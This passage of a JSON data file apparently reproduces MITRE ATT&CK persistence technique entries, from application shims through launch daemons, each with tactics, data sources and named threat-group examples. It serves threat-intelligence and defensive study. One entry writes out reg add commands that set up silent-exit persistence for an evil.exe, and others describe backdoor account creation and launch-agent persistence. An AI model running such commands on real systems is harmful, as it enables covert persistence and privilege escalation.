acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.\n",
            "ID": "T1138",
            "Tactic": "Persistence, Privilege Escalation",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator",
            "Data Sources: ": "Loaded DLLs, System calls, Windows Registry, Process monitoring, Process command-line parameters",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "FIN7",
                    "Description": "FIN7 has used application shim databases for persistence.[2]"
                }
            ]
        },
        "Authentication Package": {
            "Name": "Authentication Package",
            "Description": "Windows Authentication Package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system. [1]Adversaries can use the autostart mechanism provided by LSA Authentication Packages for persistence by placing a reference to a binary in the Windows Registry location HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ with the key value of \"Authentication Packages\"=. The binary will then be executed by the system when the authentication packages are loaded.\n",
            "ID": "T1131",
            "Tactic": "Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator",
            "Data Sources: ": "DLL monitoring, Windows Registry, Loaded DLLs",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Flame",
                    "Description": "Flame can use Windows Authentication Packages for persistence.[2]"
                }
            ]
        },
        "BITS Jobs": {
            "Name": "BITS Jobs",
            "Description": "Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). [1] [2] BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.The interface to create and manage BITS jobs is accessible through PowerShell [2] and the BITSAdmin tool. [3]Adversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. [4] [5] [6] BITS enabled execution may also allow Persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots). [7] [4]BITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol. [4]\n",
            "ID": "T1197",
            "Tactic": "Defense Evasion, Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM",
            "Data Sources: ": "API monitoring, Packet capture, Windows event logs",
            "Defense Bypassed: ": "Firewall, Host forensic analysis",
            "Contributors: ": "Ricardo Dias; Red Canary",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can download a hosted \"beacon\" payload using BITSAdmin.[8]"
                },
                {
                    "Name": "JPIN",
                    "Description": "A JPIN variant downloads the backdoor payload via the BITS service.[9]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan has used bitsadmin.exe to download additional tools.[10]"
                }
            ]
        },
        "Bootkit": {
            "Name": "Bootkit",
            "Description": "A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). [1]Adversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.Master Boot RecordThe MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. [2]Volume Boot RecordThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.\n",
            "ID": "T1067",
            "Tactic": "Persistence",
            "Platform: ": "Linux, Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "API monitoring, MBR, VBR",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "APT28 has deployed a bootkit along with Downdelph to ensure its persistence on the victim. The bootkit shares code with some variants of BlackEnergy.[3]"
                },
                {
                    "Name": "BOOTRASH",
                    "Description": "BOOTRASH is a Volume Boot Record (VBR) bootkit that uses the VBR to maintain persistence.[1]"
                },
                {
                    "Name": "FinFisher",
                    "Description": "Some FinFisher variants incorporate an MBR rootkit.[4][5]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down.[6][7]"
                },
                {
                    "Name": "ROCKBOOT",
                    "Description": "ROCKBOOT is a Master Boot Record (MBR) bootkit that uses the MBR to establish persistence.[8]"
                }
            ]
        },
        "Browser Extensions": {
            "Name": "Browser Extensions",
            "Description": "Browser extensions or plugins are small programs that can add functionality and customize aspects of internet browsers. They can be installed directly or through a browser's app store. Extensions generally have access and permissions to everything that the browser can access. [1] [2]Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so may not be difficult for malicious extensions to defeat automated scanners and be uploaded. [3] Once the extension is installed, it can browse to websites in the background, [4] [5] steal all information that a user enters into a browser, to include credentials, [6] [7] and be used as an installer for a RAT for persistence. There have been instances of botnets using a persistent backdoor through malicious Chrome extensions. [8] There have also been similar examples of extensions being used for command & control  [9].\n",
            "ID": "T1176",
            "Tactic": "Persistence",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Network protocol analysis, Packet capture, System calls, Process use of network, Process monitoring, Browser extensions",
            "Contributors: ": "Justin Warner, ICEBRG",
            "Version": "1.0"
        },
        "Change Default File Association": {
            "Name": "Change Default File Association",
            "Description": "When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access [1] [2] or by administrators using the built-in assoc utility. [3] Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.System file associations are listed under HKEY_CLASSES_ROOT.[extension], for example HKEY_CLASSES_ROOT.txt. The entries point to a handler for that extension located at HKEY_CLASSES_ROOT[handler]. The various commands are then listed as subkeys underneath the shell key at HKEY_CLASSES_ROOT[handler]\\shell[action]\\command. For example: HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command* HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\commandThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. [4]\n",
            "ID": "T1042",
            "Tactic": "Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM",
            "Data Sources: ": "Windows Registry, Process monitoring, Process command-line parameters",
            "CAPEC ID: ": "CAPEC-556",
            "Contributors: ": "Stefan Kanthak; Travis Smith, Tripwire",
            "Version": "1.0"
        },
        "Component Firmware": {
            "Name": "Component Firmware",
            "Description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to System Firmware but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.\n",
            "ID": "T1109",
            "Tactic": "Defense Evasion, Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "SYSTEM",
            "Data Sources: ": "Disk forensics, API monitoring, Process monitoring, Component firmware",
            "Defense Bypassed: ": "File monitoring, Host intrusion prevention systems, Anti-virus",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Equation",
                    "Description": "Equation is known to have the capability to overwrite the firmware on hard drives from some manufacturers.[1]"
                }
            ]
        },
        "Component Object Model Hijacking": {
            "Name": "Component Object Model Hijacking",
            "Description": "The  [1] (COM) is a system within Windows to enable interaction between software components through the operating system. [1] Adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. [2] An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.\n",
            "ID": "T1122",
            "Tactic": "Defense Evasion, Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Windows Registry, DLL monitoring, Loaded DLLs",
            "Defense Bypassed: ": "Autoruns Analysis",
            "Contributors: ": "ENDGAME",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "Some variants of ADVSTORESHELL achieve persistence by registering the payload as a Shell Icon Overlay handler COM object.[3]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 has used COM hijacking for persistence by replacing the legitimate MMDeviceEnumerator object with a payload.[4]"
                },
                {
                    "Name": "BBSRAT",
                    "Description": "BBSRAT has been seen persisting via COM hijacking through replacement of the COM object for MruPidlList {42aedc87-2188-41fd-b9a3-0c966feabec1} or Microsoft WBEM New Event Subsystem {F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1} depending on the system's CPU architecture.[5]"
                },
                {
                    "Name": "ComRAT",
                    "Description": "ComRAT samples have been seen which hijack COM objects for persistence by replacing the path to shell32.dll in registry location HKCU\\Software\\Classes\\CLSID{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32.[6]"
                },
                {
                    "Name": "JHUHUGIT",
                    "Description": "JHUHUGIT has used COM hijacking to establish persistence by hijacking a class named MMDeviceEnumerator and also by registering the payload as a Shell Icon Overlay handler COM object ({3543619C-D563-43f7-95EA-4DA7E1CC396A}).[4]"
                },
                {
                    "Name": "Mosquito",
                    "Description": "Mosquito uses COM hijacking as a method of persistence.[7]"
                }
            ]
        },
        "Create Account": {
            "Name": "Create Account",
            "Description": "Adversaries with a sufficient level of access may create a local system or domain account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.The net user commands can be used to create a local or domain account.\n",
            "ID": "T1136",
            "Tactic": "Persistence",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "Administrator",
            "Data Sources: ": "Process monitoring, Process command-line parameters, Authentication logs, Windows event logs",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT3",
                    "Description": "APT3 has been known to create or enable accounts, such as support_388945a0.[1]"
                },
                {
                    "Name": "Calisto",
                    "Description": "Calisto has the capability to add its own account to the victim's machine.[2]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak can create a Windows account.[3]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target.[4][5]"
                },
                {
                    "Name": "Flame",
                    "Description": "Flame can create backdoor accounts with the login \"HelpAssistant\" with the Limbo module.[6][7]"
                },
                {
                    "Name": "Leafminer",
                    "Description": "Leafminer used a tool called Imecab to set up a persistent remote access account on the victim machine.[8]"
                },
                {
                    "Name": "Mis-Type",
                    "Description": "Mis-Type may create a temporary user on the system named \"Lost_{Unique Identifier}.\"[9]"
                },
                {
                    "Name": "Net",
                    "Description": "The net user username \\password and net user username \\password \\domain commands in Net can be used to create a local or domain account respectively.[10]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy can user PowerView to perform \"net user\" commands and create local system and domain accounts.[11]"
                },
                {
                    "Name": "S-Type",
                    "Description": "S-Type may create a temporary user on the system named \"Lost_{Unique Identifier}\" with the password \"pond~!@6\"{Unique Identifier}.\"[9]"
                }
            ]
        },
        "DLL Search Order Hijacking": {
            "Name": "DLL Search Order Hijacking",
            "Description": "Windows systems use a common method to look for required DLLs to load into a program. [1] Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence. Adversaries may perform DLL preloading, also called binary planting attacks, [2] by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. [3] Adversaries may use this behavior to cause the program to load a malicious DLL. Adversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation. [4] [5] [6]If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.\n",
            "ID": "T1038",
            "Tactic": "Persistence, Privilege Escalation, Defense Evasion",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM",
            "Effective Permissions: ": "User, Administrator, SYSTEM",
            "Data Sources: ": "File monitoring, DLL monitoring, Process monitoring, Process command-line parameters",
            "Defense Bypassed: ": "Process whitelisting",
            "CAPEC ID: ": "CAPEC-471",
            "Contributors: ": "Stefan Kanthak; Travis Smith, Tripwire",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Downdelph",
                    "Description": "Downdelph uses search order hijacking of the Windows executable sysprep.exe to escalate privileges.[7]"
                },
                {
                    "Name": "FinFisher",
                    "Description": "A FinFisher variant uses DLL search order hijacking.[8][9]"
                },
                {
                    "Name": "HTTPBrowser",
                    "Description": "HTTPBrowser abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll.[10]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole can be launched by using DLL search order hijacking in which the wrapper DLL is placed in the same folder as explorer.exe and loaded during startup into the Windows Explorer process instead of the legitimate library.[11]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has used DLL search order hijacking.[12]"
                },
                {
                    "Name": "MirageFox",
                    "Description": "MirageFox is likely loaded via DLL hijacking into a legitimate McAfee binary.[13]"
                },
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit DLL hijacking opportunities in services and processes.[14][15]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "Prikormka uses DLL search order hijacking for persistence by saving itself as ntshrui.dll to the Windows directory so it will load before the legitimate ntshrui.dll saved in the System32 subdirectory.[16]"
                },
                {
                    "Name": "RedLeaves",
                    "Description": "RedLeaves is launched through use of DLL search order hijacking to load a malicious dll.[17]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 has performed DLL search order hijacking to execute their payload.[18]"
                },
                {
                    "Name": "WEBC2",
                    "Description": "Variants of WEBC2 achieve persistence by using DLL search order hijacking, usually by copying the DLL file to %SYSTEMROOT% (C:\\WINDOWS\\ntshrui.dll).[19]"
                }
            ]
        },
        "Dylib Hijacking": {
            "Name": "Dylib Hijacking",
            "Description": "macOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. Adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence.A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. [1] [2]If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level. This can be used by adversaries as a privilege escalation technique.\n",
            "ID": "T1157",
            "Tactic": "Persistence, Privilege Escalation",
            "Platform: ": "macOS",
            "Permissions Required: ": "User",
            "Effective Permissions: ": "Administrator, root",
            "Data Sources: ": "File monitoring",
            "Version": "1.0"
        },
        "External Remote Services": {
            "Name": "External Remote Services",
            "Description": "Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management can also be used externally.Adversaries may use remote services to access and persist within a network. [1] Access to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as part of Redundant Access during an operation.\n",
            "ID": "T1133",
            "Tactic": "Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Authentication logs",
            "Contributors: ": "Daniel Oakley; Travis Smith, Tripwire",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT18",
                    "Description": "APT18 actors leverage legitimate credentials to log into external remote services.[2]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 used VPNs and Outlook Web Access (OWA) to maintain access to victim networks.[3][4]"
                },
                {
                    "Name": "FIN5",
                    "Description": "FIN5 has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment.[5][6][7]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang regained access after eviction via the corporate VPN solution with a stolen VPN certificate, which they had extracted from a compromised host.[8]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig uses remote services such as VPN, Citrix, or OWA to persist in an environment.[9]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 actors look for and use VPN profiles during an operation to access the network using external VPN services.[10]"
                }
            ]
        },
        "File System Permissions Weakness": {
            "Name": "File System Permissions Weakness",
            "Description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.ServicesManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.Executable InstallersAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of DLL Search Order Hijacking. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to Bypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors. [1] [2]\n",
            "ID": "T1044",
            "Tactic": "Persistence, Privilege Escalation",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, User",
            "Effective Permissions: ": "SYSTEM, User, Administrator",
            "Data Sources: ": "File monitoring, Services, Process command-line parameters",
            "CAPEC ID: ": "CAPEC-17",
            "Contributors: ": "Stefan Kanthak; Travis Smith, Tripwire",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "BlackEnergy",
                    "Description": "One variant of BlackEnergy locates existing driver services that have been disabled and drops its driver component into one of those service's paths, replacing the legitimate executable. The malware then sets the hijacked service to start automatically to establish persistence.[3]"
                }
            ]
        },
        "Hidden Files and Directories": {
            "Name": "Hidden Files and Directories",
            "Description": "To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls –a for Linux and macOS).Adversaries can use this to their advantage to hide files and folders anywhere on the system for persistence and evading a typical user or system analysis that does not incorporate investigation of hidden files.WindowsUsers can mark specific files as hidden by using the attrib.exe binary. Simply do attrib +h filename to mark a file or folder as hidden. Similarly, the \"+s\" marks a file as a system file and the \"+r\" flag marks the file as read only. Like most windows binaries, the attrib.exe binary provides the ability to apply these changes recursively \"/S\".Linux/MacUsers can mark specific files as hidden simply by putting a \".\" as the first character in the file or folder name  [1] [2]. Files and folder that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like \"ls\". Users must specifically change settings to have these files viewable. For command line usages, there is typically a flag to see all files (including hidden ones). To view these files in the Finder Application, the following command must be executed: defaults write com.apple.finder AppleShowAllFiles YES, and then relaunch the Finder Application.MacFiles on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app [3].Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.\n",
            "ID": "T1158",
            "Tactic": "Defense Evasion, Persistence",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters",
            "Defense Bypassed: ": "Host forensic analysis",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "An APT28 loader Trojan saves its payload with hidden file attributes.[4]"
                },
                {
                    "Name": "Calisto",
                    "Description": "Calisto uses a hidden directory named .calisto to store data from the victim’s machine before exfiltration.[5][6]"
                },
                {
                    "Name": "FruitFly",
                    "Description": "FruitFly saves itself with a leading \".\" to make it a hidden file.[7]"
                },
                {
                    "Name": "iKitten",
                    "Description": "iKitten saves itself with a leading \".\" so that it's hidden from users by default.[7]"
                },
                {
                    "Name": "Komplex",
                    "Description": "The Komplex payload is stored in a hidden directory at /Users/Shared/.local/kextd.[1]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "A Lazarus Group VBA Macro sets its file attributes to System and Hidden.[8]"
                },
                {
                    "Name": "MacSpy",
                    "Description": "MacSpy stores itself in ~/Library/.DS_Stores/ [9]"
                }
            ]
        },
        "Hooking": {
            "Name": "Hooking",
            "Description": "Windows processes often leverage application programming interface (API) functions to perform tasks that require reusable system resources. Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions. Hooking involves redirecting calls to these functions and can be implemented via:Hooks procedures, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs. [1] [2]Import address table (IAT) hooking, which use modifications to a process’s IAT, where pointers to imported API functions are stored. [2] [3] [4]Inline hooking, which overwrites the first bytes in an API function to redirect code flow. [2] [5] [4]Similar to Process Injection, adversaries may use hooking to load and execute malicious code within the context of another process, masking the execution while also allowing access to the process's memory and possibly elevated privileges. Installing hooking mechanisms may also provide Persistence via continuous invocation when the functions are called through normal use.Malicious hooking mechanisms may also capture API calls that include parameters that reveal user authentication credentials for Credential Access. [6]Hooking is commonly utilized by Rootkits to conceal files, processes, Registry keys, and other objects in order to hide malware and associated behaviors. [7]\n",
            "ID": "T1179",
            "Tactic": "Persistence, Privilege Escalation, Credential Access",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "API monitoring, Binary file metadata, DLL monitoring, Loaded DLLs, Process monitoring, Windows event logs",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "FinFisher",
                    "Description": "FinFisher hooks processes by modifying IAT pointers to CreateWindowEx.[8][2]"
                },
                {
                    "Name": "PLATINUM",
                    "Description": "PLATINUM is capable of using Windows hook interfaces for information gathering such as credential access.[9]"
                }
            ]
        },
        "Hypervisor": {
            "Name": "Hypervisor",
            "Description": "A type-1 hypervisor is a software layer that sits between the guest operating systems and system's hardware. [1] It presents a virtual running environment to an operating system. An example of a common hypervisor is Xen. [2] A type-1 hypervisor operates at a level below the operating system and could be designed with Rootkit functionality to hide its existence from the guest operating system. [3] A malicious hypervisor of this nature could be used to persist on systems through interruption.\n",
            "ID": "T1062",
            "Tactic": "Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "System calls",
            "CAPEC ID: ": "CAPEC-552",
            "Version": "1.0"
        },
        "Image File Execution Options Injection": {
            "Name": "Image File Execution Options Injection",
            "Description": "Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., \"C:\\dbg\\ntsd.exe -g  notepad.exe\"). [1]IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. [2] IFEOs are represented as Debugger values in the Registry under HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ where  is the binary on which the debugger is attached. [1]IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). [3] [4] Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IEFO and silent process exit Registry values in HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\. [3] [4]An example where the evil.exe process is started when notepad.exe exits: [4]reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v ReportingMode /t REG_DWORD /d 1reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v MonitorProcess /d \"C:\\temp\\evil.exe\"Similar to Process Injection, these values may be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. [5] Installing IFEO mechanisms may also provide Persistence via continuous invocation.Malware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. [6] [7]\n",
            "ID": "T1183",
            "Tactic": "Privilege Escalation, Persistence, Defense Evasion",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "Process monitoring, Windows Registry, Windows event logs",
            "Defense Bypassed: ": "Autoruns Analysis",
            "Contributors: ": "Oddvar Moe, @oddvarmoe",
            "Version": "1.0"
        },
        "Kernel Modules and Extensions": {
            "Name": "Kernel Modules and Extensions",
            "Description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. [1] When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode Rootkit that run with the highest operating system privilege (Ring 0). [2] Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. [3] [4] [5] [6]Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. [7]Kernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through kextload and kextunload commands. Several examples have been found where this can be used. [8] [9] Examples have been found in the wild. [10]\n",
            "ID": "T1215",
            "Tactic": "Persistence",
            "Platform: ": "Linux, macOS",
            "Permissions Required: ": "root",
            "Data Sources: ": "System calls, Process monitoring, Process command-line parameters",
            "Contributors: ": "Jeremy Galloway; Red Canary",
            "Version": "1.0"
        },
        "Launch Agent": {
            "Name": "Launch Agent",
            "Description": "Per Apple’s developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in /System/Library/LaunchAgents, /Library/LaunchAgents, and $HOME/Library/LaunchAgents [1] [2] [3]. These launch agents have property list files which point to the executables that will be launched [4].Adversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories  [5] [6]. The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in [7] [8]. They can be set up to execute when a specific user logs in (in the specific user’s directory structure) or when any user logs in (which requires administrator privileges).\n",
            "ID": "T1159",
            "Tactic": "Persistence",
            "Platform: ": "macOS",
            "Permissions Required: ": "User, Administrator",
            "Data Sources: ": "File monitoring, Process monitoring",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Calisto",
                    "Description": "Calisto adds a .plist file to the /Library/LaunchAgents folder to maintain persistence.[9]"
                },
                {
                    "Name": "CrossRAT",
                    "Description": "CrossRAT creates a Launch Agent on macOS."
                },
                {
                    "Name": "Dok",
                    "Description": "Dok persists via a Launch Agent.[10]"
                },
                {
                    "Name": "FruitFly",
                    "Description": "FruitFly persists via a Launch Agent.[10]"
                },
                {
                    "Name": "Keydnap",
                    "Description": "Keydnap uses a Launch Agent to persist.[11]"
                },
                {
                    "Name": "Komplex",
                    "Description": "The Komplex trojan creates a persistent launch agent called with $HOME/Library/LaunchAgents/com.apple.updates.plist with launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist.[5]"
                },
                {
                    "Name": "MacSpy",
                    "Description": "MacSpy persists via a Launch Agent.[10]"
                },
                {
                    "Name": "Proton",
                    "Description": "Proton persists via a Launch Agent.[10]"
                }
            ]
        },
        "Launch Daemon": {
            "Name": "Launch Daemon",
            "Description": "Per Apple’s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in /System/Library/LaunchDaemons and /Library/LaunchDaemons [1]. These LaunchDaemons have property list files which point to the executables that will be launched [2].Adversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories [3]. The daemon name may be disguised by using a name from a related operating system or benign software  [4]. Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root.The plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon’s executable and gain persistence or Privilege Escalation.\n",
            "ID": "T1160",
            "Tactic": "Persistence, Privilege Escalation",
            "Platform: ": "macOS",
            "Permissions Required: ": "Administrator",
            "Effective Permissions: ": "root",
            "Data Sources: ": "Process monitoring, File monitoring",
            "Version": "1.0"
        },
        "LC_LOAD_DYLIB Addition": {
            "Name": "LC_LOAD_DYLIB Addition",
